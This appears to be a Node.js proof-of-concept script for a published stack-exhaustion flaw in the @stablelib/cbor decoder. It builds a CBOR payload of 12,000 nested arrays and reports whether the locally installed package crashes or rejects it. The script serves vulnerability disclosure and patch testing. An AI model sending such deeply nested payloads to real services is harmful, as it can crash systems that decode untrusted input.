#!/usr/bin/env node
// @stablelib/cbor Stack Exhaustion DoS PoC (GHSA-5jg4-p4qw-cgfr)
// Usage: node poc.js

let decode;
try {
  const stablelibCbor = require(require.resolve('@stablelib/cbor', { paths: [process.cwd()] }));
  decode = stablelibCbor.decode;
} catch (e) {
  console.log("Please install @stablelib/cbor locally first to run the PoC.");
  console.log("Example: npm i @stablelib/cbor@2.0.1");
  process.exit(1);
}

console.log("[*] Generating a deeply nested CBOR payload (depth=12000)...");
const depth = 12000;
const payload = new Uint8Array(depth + 1);

// Build [[[...[null]...]]]
payload.fill(0x81, 0, depth); // 0x81 is array of length 1
payload[depth] = 0xf6;        // 0xf6 is null

console.log("[*] Decoding payload...");

try {
  decode(payload);
  console.log("[SAFE] Successfully decoded without crashing. The package is patched!");
} catch (err) {
  if (err instanceof RangeError) {
    console.log("[VULNERABLE] Crashed with RangeError: Maximum call stack size exceeded.");
    console.log(err.stack.split('\n').slice(0, 5).join('\n'));
    process.exit(1);
  } else if (err.name === 'CBORMaxDepthExceededError' || (err.message && err.message.includes('depth'))) {
    console.log(`[SAFE] The decoder safely rejected the deep payload: ${err.message}`);
    process.exit(0);
  } else {
    console.log("An unexpected error occurred:", err);
  }
}
